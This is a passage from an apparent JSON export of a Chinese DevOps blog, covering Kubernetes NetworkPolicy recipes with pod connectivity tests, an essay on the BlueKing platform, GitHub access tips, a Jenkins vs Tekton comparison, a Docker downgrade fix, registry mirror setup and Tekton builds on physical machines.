端口 TCP 流量，同时允许全部命名空间的任意端口流量。\n1 2 3 4 5 6 egress: - ports: - port: 443 protocol: TCP to: - namespaceSelector: {} 表示允许指向全部命名空间的 443 端口 TCP 流量。\n3.1 拒绝访问 Pod 的全部流量 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --labels app=web --expose --port 80 运行一个临时的 Pod 测试网络 验证默认情况下，Kubernetes 对流量没有进行限制。\n1 2 3 4 5 6 7 kubectl run --generator=run-pod/v1 --rm -i -t --image=alpine test-$RANDOM -- sh / # wget -qO- http://web \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; ... 创建网络策略 包含 app=web 标签的 Pods 将拒绝全部访问流量。Ingress 为 [] 的含义是匹配的实体为空。\n1 2 3 4 5 6 7 8 9 10 11 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: web-deny-all spec: podSelector: matchLabels: app: web ingress: [] EOF 测试网络策略 1 2 3 4 kubectl run --generator=run-pod/v1 --rm -i -t --image=alpine test-$RANDOM -- sh / # wget -qO- --timeout=2 http://web wget: download timed out 清理环境 1 2 3 kubectl delete pod web kubectl delete service web kubectl delete networkpolicy web-deny-all 3.2 仅允许指定的 Pods 访问应用 创建负载 1 kubectl run --generator=run-pod/v1 apiserver --image=nginx --labels app=bookstore,role=api --expose --port 80 创建网络策略 仅允许包含标签 app=bookstore 的 Pods 访问应用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: api-allow spec: podSelector: matchLabels: app: bookstore role: api ingress: - from: - podSelector: matchLabels: app: bookstore EOF 测试网络策略 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://apiserver wget: download timed out 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --rm -i -t --image=alpine --labels app=bookstore,role=frontend -- sh / # wget -qO- --timeout=2 http://apiserver \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; 清理环境 1 2 3 kubectl delete pod apiserver kubectl delete service apiserver kubectl delete networkpolicy api-allow 3.3 允许访问 Pod 的全部流量 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --labels=app=web --expose --port 80 创建网络策略 Ingress 设置为 {} 空的含义是允许全部来源。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: web-allow-all namespace: default spec: podSelector: matchLabels: app: web ingress: - {} EOF 测试网络策略 1 2 3 4 5 kubectl run --generator=run-pod/v1 test-$RANDOM --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; 清理环境 1 2 kubectl delete pod,service web kubectl delete networkpolicy web-allow-all 3.4 拒绝其他命名空间的访问流量 创建负载 1 kubectl run --generator=run-pod/v1 web --namespace default --image=nginx --labels=app=web --expose --port 80 创建网络策略 仅允许 default 命名空间内的 Pods 相互访问，不允许其他命名空间的 Pods 访问。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: namespace: default name: deny-from-other-namespaces spec: podSelector: matchLabels: ingress: - from: - podSelector: {} EOF 测试网络策略 1 2 3 4 5 kubectl create namespace foo kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=foo --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default wget: download timed out 1 2 3 4 5 kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=default --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; 清理环境 1 2 3 4 kubectl delete pod web kubectl delete service web kubectl delete networkpolicy deny-from-other-namespaces kubectl delete namespace foo 3.5 允许全部命名空间访问指定的 Pods 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --namespace default --labels=app=web --expose --port 80 创建网络策略 仅允许 default 命名空间下，标签为 app=web 的 Pod 被访问。default 下的其他 Pod 不允许被访问。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: namespace: default name: web-allow-all-namespaces spec: podSelector: matchLabels: app: web ingress: - from: - namespaceSelector: {} EOF 测试网络策略 1 2 3 4 5 6 7 kubectl create namespace secondary kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=secondary --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; 清理环境 1 2 3 4 kubectl delete pod web -n default kubectl delete service web -n default kubectl delete networkpolicy web-allow-all-namespaces -n default kubectl delete namespace secondary 3.6 允许指定命名空间访问指定的 Pods 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --labels=app=web --expose --port 80 创建测试命名空间 1 2 3 4 kubectl create namespace dev kubectl label namespace/dev purpose=testing kubectl create namespace prod kubectl label namespace/prod purpose=production 创建网络策略 仅允许命名空间包含标签 purpose=production 的 Pod 访问指定的应用，其他应用不允许访问。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: web-allow-prod spec: podSelector: matchLabels: app: web ingress: - from: - namespaceSelector: matchLabels: purpose: production EOF 测试网络策略 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=dev --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default wget: download timed out 1 2 3 4 5 6 kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=prod --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; 清理环境 1 2 3 4 kubectl delete networkpolicy web-allow-prod kubectl delete pod web kubectl delete service web kubectl delete namespace {prod,dev} 3.7 仅允许指定空间中的指定 Pod 访问应用 此功能需要 Kubernetes 1.11 及以上版本。\n创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --labels=app=web --expose --port 80 创建命名空间 1 2 kubectl create namespace other kubectl label namespace/other team=operations 创建网络策略 命名空间和 Pods 需要同时满足要求时，才可以访问指定的应用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: web-allow-all-ns-monitoring namespace: default spec: podSelector: matchLabels: app: web ingress: - from: - namespaceSelector: # chooses all pods in namespaces labelled with team=operations matchLabels: team: operations podSelector: # chooses pods with type=monitoring matchLabels: type: monitoring EOF 测试网络策略 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default wget: download timed out 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --labels type=monitoring --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default wget: download timed out 1 2 3 4 kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=other --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default wget: download timed out 1 2 3 4 5 6 kubectl run --generator=run-pod/v1 test-$RANDOM --namespace=other --labels type=monitoring --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://web.default \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; 清理环境 1 2 3 4 kubectl delete networkpolicy web-allow-all-ns-monitoring kubectl delete namespace other kubectl delete pod web kubectl delete service web 3.8 仅允许访问 Pods 的指定端口 创建负载 1 kubectl run --generator=run-pod/v1 apiserver --image=ahmet/app-on-two-ports --labels=app=apiserver 这个应用将在 8000 端口返回 Hello 响应，而在 5000 端口返回监控数据。下面将 Pod 暴露到 Service 上:\n1 kubectl create service clusterip apiserver --tcp 8001:8000 --tcp 5001:5000 创建网络策略 仅允许包含标签 role=monitoring 的 Pod 访问应用的 5000 端口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: api-allow-5000 spec: podSelector: matchLabels: app: apiserver ingress: - ports: - port: 5000 from: - podSelector: matchLabels: role: monitoring EOF 测试网络策略 1 2 3 4 5 6 7 kubectl run --generator=run-pod/v1 test-$RANDOM --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://apiserver:8001 wget: download timed out / # wget -qO- --timeout=2 http://apiserver:5001/metrics wget: download timed out 1 2 3 4 5 6 7 8 9 kubectl run --generator=run-pod/v1 test-$RANDOM --labels=role=monitoring --rm -i -t --image=alpine -- sh / # wget -qO- --timeout=2 http://apiserver:8001 wget: download timed out / # wget -qO- --timeout=2 http://apiserver:5001/metrics http.requests=1 go.goroutines=5 go.cpus=4 清理环境 1 2 3 kubectl delete pod apiserver kubectl delete service apiserver kubectl delete networkpolicy api-allow-5000 3.9 使用多个选择器指定访问来源 创建负载 1 kubectl run --generator=run-pod/v1 db --image=redis:4 --port 6379 --expose --labels app=bookstore,role=db 创建网络策略 可以同时配置多个允许的来源，只需要其中一个匹配即可访问。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: NetworkPolicy apiVersion: networking.k8s.io/v1 metadata: name: redis-allow-services spec: podSelector: matchLabels: app: bookstore role: db ingress: - from: - podSelector: matchLabels: app: bookstore role: search - podSelector: matchLabels: app: bookstore role: api - podSelector: matchLabels: app: inventory role: web EOF 测试网络策略 1 2 3 4 5 6 kubectl run --generator=run-pod/v1 test-$RANDOM --labels=app=inventory,role=web --rm -i -t --image=alpine -- sh / # nc -v -w 2 db 6379 db (10.59.242.200:6379) open (works) 1 2 3 4 5 6 kubectl run --generator=run-pod/v1 test-$RANDOM --labels=app=other --rm -i -t --image=alpine -- sh / # nc -v -w 2 db 6379 nc: db (10.59.252.83:6379): Operation timed out (traffic blocked) 清理空间 1 2 3 kubectl delete pod db kubectl delete service db kubectl delete networkpolicy redis-allow-services 3.10 禁止 Pod 的出口流量 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --port 80 --expose --labels app=web 创建网络策略 禁止包含标签 app=foo 的 Pod 任何出口流量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: foo-deny-egress spec: podSelector: matchLabels: app: foo policyTypes: - Egress egress: [] EOF 测试网络策略 1 2 3 4 5 6 7 kubectl run --generator=run-pod/v1 --rm --restart=Never --image=alpine -i -t -l app=foo test -- ash / # wget -qO- --timeout 1 http://web:80/ wget: bad address \u0026#39;web:80\u0026#39; / # wget -qO- --timeout 1 http://www.example.com/ wget: bad address \u0026#39;www.example.com\u0026#39; 清理环境 1 2 kubectl delete pod,service web kubectl delete networkpolicy foo-deny-egress 3.11 拒绝外部出口流量 创建负载 1 kubectl run --generator=run-pod/v1 web --image=nginx --port 80 --expose --labels app=web 创建网络策略 允许包含标签 app=foo 的 Pods 访问全部 53 端口的服务，同时允许访问全部命名空间的应用。这里的 ports 和 to 是或的关系。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: foo-deny-external-egress spec: podSelector: matchLabels: app: foo policyTypes: - Egress egress: - ports: - port: 53 protocol: UDP - port: 53 protocol: TCP - to: - namespaceSelector: {} EOF 测试网络策略 1 2 3 4 5 6 7 8 9 10 kubectl run --generator=run-pod/v1 --rm --restart=Never --image=alpine -i -t -l app=foo test -- ash / # wget -O- --timeout 1 http://web:80 Connecting to web (10.59.245.232:80) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; / # wget -O- --timeout 1 http://www.example.com Connecting to www.example.com (93.184.216.34:80) wget: download timed out 清理环境 1 2 kubectl delete pod,service web kubectl delete networkpolicy foo-deny-external-egress 4. 参考 https://kubernetes.io/zh/docs/concepts/services-networking/network-policies/ https://github.com/ahmetb/kubernetes-network-policy-recipes/ ","description":"","id":221,"section":"post","tags":["整理","Kubernetes","网络隔离"],"title":"Kubernetes 之网络隔离(内附十多种使用场景)","uri":"https://www.chenshaowen.com/blog/network-policy-of-kubernetes.html"},{"content":"1. 我的平台建设经历 毕业之后，我加入了腾讯蓝鲸，主要参与 SaaS 的开发。待了近三年之后，回武汉老家，加入青云，负责 DevOps 的研发。待了近两年之后，加入新的公司，参与业务支撑平台建设，思考业务侧对 Kubernetes 的落地实践。\n我写过很多关于平台的文档，领域输出才是 PaaS 的核心竞争力 、大公司和小公司的 ToB 思路 、云原生下的 DevOps 平台 、ToB 创业公司的开源之路 - KubeSphere 、企业如何打造 ToB 产品 等，这些都是工作内容带给我的思考。\n最近接触的一些事，让我有为蓝鲸再写一篇文档的想法。身处武汉，上千人的互联网公司不多，斗鱼和金山办公属于佼佼者。但他们都相继放弃了蓝鲸。这让我不解，蓝鲸是我对平台建设思考的起点。虽然我离开了蓝鲸、也离开了 KubeSphere，但一如既往地希望这两款产品能够被越来越多的人接受并使用。一方面是出于情感的原因，另一方面是他们真的很优秀。这是两款非常不一样的产品，有非常多可圈可点的地方。\n2. 蓝鲸的核心价值 2.1 工具文化 蓝鲸提倡的是工具文化，解放运维，挖掘运维的价值。\n我对工具文化的理解主要分为三个层次：\n技能文档化。技能不应该与人绑定，而是可以复制的。将经验实践写成文档是低成本的沉淀和传播方式。 文档工具化。再好的文档都不如一个脚本来得直接。将技能文档转换为一键式的脚本，将技能的输出又提升了一个档次。 工具产品化。工具的领域概念太多，运行环境复杂。通过产品可以降低使用门槛，更好输出价值。 有了这样的思路，无论是建设团队，还是建设平台都将会事半功倍。但蓝鲸的价值不止于此。\n2.2 直达 PaaS 金字塔 以运维系统为例，我们一起来建设一个平台，其他场景类似。\n第一阶段 起初是百废待兴，有什么现成的东西就上什么，找不到就自己开发。监控、告警、日志、CICD、通知，各自为战，解决业务需求。因此，出现了下面这张拓扑。\n第二阶段 随着时间的推移，孤立的信息源已经无法给业务带来更多边际价值，系统与系统之间的壁垒阻碍了 IT 基础设施的建设。因此，我们将关联的系统打通，相互调用。至此，出现了下面这张拓扑。\n很多平台最终会停留在第二个阶段，因为 N 个系统就会有 N *（N -1）种连接，他们已经没有精力再干其他的事。\n第三阶段 下面是新的拓扑结构。\n所有的系统应该接入 PaaS ，通过 PaaS 标准化系统之间的调用。将问题的复杂度从 N 平方降到了 N 。\n系统内部自治，可以随意变更，但对外需要提供统一的 API 接口，以供其他系统消费。同时需要配套相关的 SDK、CLI 等工具，降低使用门槛。\n蓝鲸直达第三阶段，跳过了粗犷原始的第一阶段、充满陷阱的第二阶段。\n2.3 领域迁移 虽然蓝鲸面向的是运维行业，但具备很强的迁移能力。\n下图是蓝鲸架构的抽象。\n最早接触到 aPaaS 和 iPaaS 是从 Gartner 的魔力象限，但真正落地是在蓝鲸。aPaaS 主要是托管应用，让服务可以免运维; iPaaS 主要是聚合 API 向其他应用提供标准化的接口。\n针对运维领域，蓝鲸实现了作业平台、配置平台等。无论业务需要怎样的功能，只要运维领域的实现是稳定的，蓝鲸就能支撑研发快速交付 SaaS 。如果你有关注蓝鲸公开课或者蓝鲸开发者认证考试，就会有所了解，开发一个 SaaS 只需要几个小时。\n那么如果将蓝鲸迁移到非运维领域，其实只需要补齐 iPaaS 的领域实现即可。比如，电商行业，需要补齐支付、物流、订单、评论管理等。\n3. 使用蓝鲸会遇到的阻碍 3.1 代码部分开源 很多潜在的客户使用蓝鲸，是因为大批好用而免费的 SaaS。犹如饿汉被曼妙的身姿吸引。走近一看，却发现了斑斑点点，部分 SaaS 不开源，有些恼羞成怒，而忽略了其内在的美。\nOpen Core 是非常常见的开源策略。将 PaaS 平台开源，而 SaaS 大部分闭源，蓝鲸采取的就是这种策略。\nPaaS 才是蓝鲸的价值核心，将 SaaS 当做第三方闭源系统使用即可。即使 SaaS 开源，也不是每个工程师能改得动。蓝鲸已经开源的 SaaS 有标准运维、蓝盾、容器管理平台，但想要参与进去也并不是一件容易的事。\n3.2 技术人员的骄傲 骄傲的工程师表现在对现有系统的自信，而排斥外来系统。\n在调研蓝鲸时，工程师应该保持空杯心态，多看官方的文档，多动手实践，不清楚的地方不要轻易否定，多和社区沟通。\n初次部署、运维、使用蓝鲸时，肯定会遇到各种各样的问题。研究产品、解决问题也是一个学习成长的过程，蓝鲸是一个庞大的产品体系，与你过往接触的平台会有所不同。工程师需要多一点耐心去理解蓝鲸的设计。\n蓝鲸始自 2012 年，从 2016 年开始放出社区版，历经这么多年而保持增长，肯定有其原因。工程师对蓝鲸产品本身也要有信心。\n3.3 服务太贵 IT 的 ToB 公司琢磨了很多普通公司的需求场景。\n外包。不想长期投入研发。 运维。不想部署、运维产品。 等保。安全问题束手无措。 培训。新东西上手慢。 咨询。陷入技术难解之题。 定制。想要个性化改造。\n\u0026hellip; 这些 ToB 公司生存的空间在于客户招工程师的成本太高。由 ToB 公司为非核心业务提供兜底服务，符合社会分工的协作方式，将合适的事交给合适的人做。\n蓝鲸周围有很多的服务商，蓝鲸企业版服务贵不贵得看蓝鲸能节约多少成本、自己维护需要多少成本。运维系统从来都不是一蹴而就的，而是一个不断演化改进的过程，需要自行评估。\n从另外一个角度看，相较于其他开源产品，如果没有 SLA 服务商，用钱都解决不了问题，这才是真的问题。起码蓝鲸的问题，用钱还是可以解决的。\n3.4 迁移成本太高 对于有一些 IT 基础设施的公司来说，使用蓝鲸意味着要放弃自己的 CMDB 等系统。这似乎有些不可接受。\n但其实我反复强调的是，蓝鲸的核心在于 PaaS，底层的领域实现可以替换。只需要接入到 iPaaS ，以供上层系统消费即可。\n另一个方案是将蓝鲸作为一个第三方系统，自己建设一套 PaaS ，将蓝鲸接入到自己的 iPaaS 中。即使用武力征服，最终也会被同化。蓝鲸是一个值得珍惜产品。妙哉！\n","description":"","id":222,"section":"post","tags":["博文","PaaS","思考","平台"],"title":"珍惜你遇到的蓝鲸","uri":"https://www.chenshaowen.com/blog/blueking-is-a-platform-worth-having.html"},{"content":" 由于众所周知的原因，在国内的网络环境下，访问 Github 时，网络会阻断或者很慢。本文提供了若干访问方法。\n1. 使用 Github Mirror 下载 直接在 GitHub 仓库前面拼接 Proxy 地址，不同的 Mirror 拼接方式可能有所不同。下面以拉取 https://github.com/shaowenchen/scripts 仓库为例。\nhttps://ghproxy.chenshaowen.com 1 git clone https://ghproxy.chenshaowen.com/https://github.com/shaowenchen/ops 2. 通过 Gitee 导入 GitHub 项目 可以参考文档: GitHub仓库快速导入Gitee及同步更新, 将 GitHub 仓库导入 Gitee。\n然后使用 Gitee 的地址拉取代码。\n3. 配置 Github Host 地址 打开 https://www.ipaddress.com/ 查询 github.com 的 IP 地址\n编辑本地 /etc/hosts 文件，添加如下内容:\n1 140.82.112.4 github.com 接着就可以拉取代码了，但是速度并不会很快，因为 Github 用的是美国 IP。\n4. 配置命令行代理 如果有可用的代理服务，那么在本地 Terminal 中配置代理即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Proxy function proxy_off(){ unset http_proxy unset HTTP_PROXY unset https_proxy unset HTTPS_PROXY echo -e \u0026#34;已关闭代理\u0026#34; } function proxy_on(){ export http_proxy=\u0026#34;http://127.0.0.1:1087\u0026#34;; export HTTP_PROXY=\u0026#34;http://127.0.0.1:1087\u0026#34;; export https_proxy=\u0026#34;http://127.0.0.1:1087\u0026#34;; export HTTPS_PROXY=\u0026#34;http://127.0.0.1:1087\u0026#34;; echo -e \u0026#34;已开启代理\u0026#34; } ","description":"","id":223,"section":"post","tags":["博文","Github","研发"],"title":"国内访问 GitHub 的若干方法","uri":"https://www.chenshaowen.com/blog/some-tips-to-access-github.html"},{"content":"下面是一个 Jenkins 与 Tekton 对比的列表:\n功能 Jenkins Tekton 编程语言 Java Golang 开发插件语言 Java Shell、Yaml 流水线描述语言 Groovy、Shell Yaml、Shell 插件生态 很多插件，LDAP、GitLab 不足 插件数量 1500+ 100+ 插件之间的兼容性 可能会有冲突，不能随便升级 完全兼容 二次开发 封装 Api 组合 Task 是否高可用 集成 Gearman、主从模式 依赖 Kuberntes 的高可用 单实例并发构建规模 几百并发 依赖 Kuberntes 的 Pod 管理能力，可以很大 数据存储 本地磁盘 Etcd 是否支持自动触发 支持 支持 是否有商业支持 无 无 ","description":"","id":224,"section":"post","tags":["博文","CICD","Jenkins","Tekton"],"title":"Jenkins 与 Tekton 的对比","uri":"https://www.chenshaowen.com/blog/jenkins-vs-tekton.html"},{"content":" 使用的是 CentOS 7，内核版本 3.10.0-327 。\n1. 查看当前 Docker 的版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 docker version Client: Docker Engine - Community Version: 20.10.6 API version: 1.41 Go version: go1.13.15 Git commit: 370c289 Built: Fri Apr 9 22:46:01 2021 OS/Arch: linux/amd64 Context: default Experimental: true Server: Docker Engine - Community Engine: Version: 20.10.6 API version: 1.41 (minimum version 1.12) Go version: go1.13.15 Git commit: 8728dd2 Built: Fri Apr 9 22:44:13 2021 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1.4.4 GitCommit: 05f951a3781f4f2c1911b05e61c160e9c30eaa8e runc: Version: 1.0.0-rc93 GitCommit: 12644e614e25b05da6fd08a38ffa0cfe1903fdec docker-init: Version: 0.19.0 GitCommit: de40ad0 能够拉取大部分镜像，但是部分镜像会报错，如下:\n1 2 3 4 5 6 7 8 9 10 11 docker pull k8s.gcr.io/kube-proxy:v1.16.12 v1.16.12: Pulling from kube-proxy 83b4483280e5: Pull complete cedd2715c2e4: Pull complete 297e97c9c472: Extracting [==================================================\u0026gt;] 2.052MB/2.052MB 67b649411e75: Download complete d97928a1765f: Download complete ffa39a529ef3: Download complete ed820abd805b: Download complete failed to register layer: ApplyLayer exit status 1 stdout: stderr: unlinkat /var/log/apt: invalid argument 2. 降低 Docker 的版本 卸载 Docker 1 yum remove -y docker* 安装指定版本的 Docker 参考文档，centos-7-安装指定版本的-docker\n查看当前安装的版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 docker version Client: Docker Engine - Community Version: 20.10.6 API version: 1.40 Go version: go1.13.15 Git commit: 370c289 Built: Fri Apr 9 22:45:33 2021 OS/Arch: linux/amd64 Context: default Experimental: true Server: Docker Engine - Community Engine: Version: 19.03.8 API version: 1.40 (minimum version 1.12) Go version: go1.12.17 Git commit: afacb8b Built: Wed Mar 11 01:25:42 2020 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1.4.4 GitCommit: 05f951a3781f4f2c1911b05e61c160e9c30eaa8e runc: Version: 1.0.0-rc93 GitCommit: 12644e614e25b05da6fd08a38ffa0cfe1903fdec docker-init: Version: 0.18.0 GitCommit: fec3683 ","description":"","id":225,"section":"post","tags":["博文","Docker","镜像"],"title":"Docker 20.10.6 拉取某些镜像报错 unlinkat","uri":"https://www.chenshaowen.com/blog/pull-images-unlinkat.html"},{"content":" Docker 的 Mirror 仅能加速 docker.io 的镜像，而不能加速私有仓库的镜像。\n1. 为什么需要一个私有的镜像仓库 mirror 公网限速 dockerhub 拉取限制频率 减少拉取镜像时间 2. 创建一个 Registry 镜像加速服务 生成一个配置文件 version: 0.1 log: fields: service: registry storage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registry http: addr: :5000 headers: X-Content-Type-Options: [nosniff] health: storagedriver: enabled: true interval: 10s threshold: 3 但这样启动的服务只能作为 Registry 而不是 Mirror。Registry 是用来存储镜像，直接对外提供服务；Mirror 使从 Registry 拿到镜像数据再转给 Client。\n添加 proxy 字段到 config.yml 文件中 在 config.yml 可以配置很多特征，比如验证秘钥、存储后端等。这里仅添加 proxy 字段，最终的 config.yml 内容如下:\nversion: 0.1 log: fields: service: registry storage: cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registry http: addr: :5000 headers: X-Content-Type-Options: [nosniff] health: storagedriver: enabled: true interval: 10s threshold: 3 proxy: remoteurl: https://registry-1.docker.io 如果使用到私有的镜像，可以按照如下格式填入账户密码，但这里的 remoteurl 不支持自建的私有仓库，只能填 Docker 官方仓库。这在官方文档: https://docs.docker.com/registry/recipes/mirror/ 有给出说明。\n1 2 3 4 proxy: remoteurl: https://registry-1.docker.io username: [username] password: [password] 启动镜像服务 创建存储目录\n1 mkdir data 启动服务\ndocker run -d -p 5000:5000 --restart=always --name mirror \\ -v `pwd`/config.yml:/etc/docker/registry/config.yml \\ -v `pwd`/data:/var/lib/registry \\ registry:2 查看服务\n1 2 3 4 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fc10fdef7e3f registry:2 \u0026#34;/entrypoint.sh /etc…\u0026#34; 1 minutes ago Up 1 minutes 0.0.0.0:5000-\u0026gt;5000/tcp mirror 3. 也可用 Dragonfly 的 Mirror 模式 新增一个配置文件 dfget.yaml 1 vim dfget.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 proxy: security: insecure: true tcpListen: listen: 0.0.0.0 port: 5000 registryMirror: dynamic: true url: https://index.docker.io proxies: - regx: blobs/sha256.* keepStorage: true storage: taskExpireTime: 6h diskGCThreshold: 50Gi 新增存储目录 1 mkdir dfdata 启动 Dfdaemoan 服务 1 2 3 4 docker run -d --name dragonfly-dfdaemon --restart=always --net=host \\ -v `pwd`/dfdata:/var/lib/dragonfly \\ -v `pwd`/dfget.yaml:/etc/dragonfly/dfget.yaml \\ dragonflyoss/dfdaemon:v2.0.4 这里不需要再部署 Dragonfly 的其他服务，而且 Dfdaemon 组件能对镜像进行生命周期管理，这是比 Registry 具有优势的地方。\n4. Docker Daemon 配置镜像加速源 修改 Docker 的配置文件 daemon.json 在 /etc/docker/daemon.json 文件中，增加镜像源\n1 2 3 4 { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;http://127.0.0.1:5000\u0026#34;], \u0026#34;live-restore\u0026#34;: true } live-restore 为 true 时，重启 Docker 不会影响正在运行的容器。\n重新加载配置 1 2 systemctl daemon-reload systemctl restart docker 查看 Docker 配置 1 docker info 测试拉取镜像 1 2 docker pull centos docker pull ubuntu 查看缓存数据大小 1 2 3 du -sh data 157M\tdata 5. 总结 本篇主要使用 Registry、Dragonfly 两种方案搭建了 docker.io 的 Mirror 加速服务。\n两种方式简单，易于维护，在办公网、IDC 网络下，都能极大加速 docker.io 的镜像拉取，节省流量费用。\n","description":"","id":226,"section":"post","tags":["博文","Docker","容器","镜像"],"title":"如何搭建一个私有的镜像仓库 mirror","uri":"https://www.chenshaowen.com/blog/how-to-run-a-private-registry-mirror.html"},{"content":"1. 为什么需要物理构建机 在文章《如何接入远程 macOS 物理机进行 Jenkins 流水线构建》中，我描述了在 Jenkins 中添加物理构建机的方法。这并不是我拍脑袋想的需求，而是当时真的有 ToB 的商业客户在咨询方案。\n对于多端开发商来说，构建 Android、IOS、macOS、Arm 、Windows、X86 应用是常见的需求。\n好的方面是 GitHub Actions 提供了 macOS 构建环境、AWS 提供了 macOS 虚拟机，而华为提供了 ARM 主机。在云原生背景下，更多使用的是 Kubernetes 运行时，在 Kubernetes 不支持的处理器架构和操作系统面前，持续集成 (CI) 显得很无力。持续集成需要支持物理构建机运行时。\n本文希望讨论的问题是在 Kubernetes 下，如何接入物理机进行 CI 的构建。本文以 Tekton 为例，其他引擎在处理逻辑上类似。\n2. Tekton 如何与物理机交互 Kuberntes 对物理机或者虚拟机的管理，实际上是一个典型的 Operator 场景。我们可以定义一个 CRD 用来描述相关字段，通过写 Controller 处理 Pod 与构建机之间的逻辑。\n也可以写 Tekton 的 Task 封装，本文将使用这种方式。由此也给我带来另一个疑问，Tekton 能否代替部分 Operator 的场景，在后续的文章中我会给出思考。\n这里仅做原型验证，不会太关注产品化的细节。\n在 Tekton 中，每个流水线由很多个 Task 构成，Task 可以并行。一个 Task 包含很多个串行的 step 步骤，对应着一个 Pod 包含很多个容器。\n这里的关键是要将 Pod 与构建机关联起来。我选择的是使用 rsync 同步 Pod 与构建机之间的文件，在 Pod 中使用 sshpass 执行物理机的构建命令。\n主要分为如下步骤 (以下命令都是在容器中执行):\n克隆代码 执行 rsync 将代码同步到构建机 执行 sshpass 在构建机上执行构建命令 执行 rsync 将构建机中的构建产物同步到容器 归档构建产物(示例中, 这一步会被省略，仅验证能拿到构建产物) 可以看到整个过程其实和 Tekton 没有直接关系，对于任意容器与构建机直连的环境都是可行的。下面以 Tekton 为例进行演示。\n3. 资源准备清单 一个 Kubernetes 集群。用来运行 Tekton，最新的 Tekton 0.23 要求 Kubernetes 不低于 1.17 一台物理机或虚拟机。用于构建应用 3.1 查看 Kubernetes 版本 1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;19\u0026#34;, 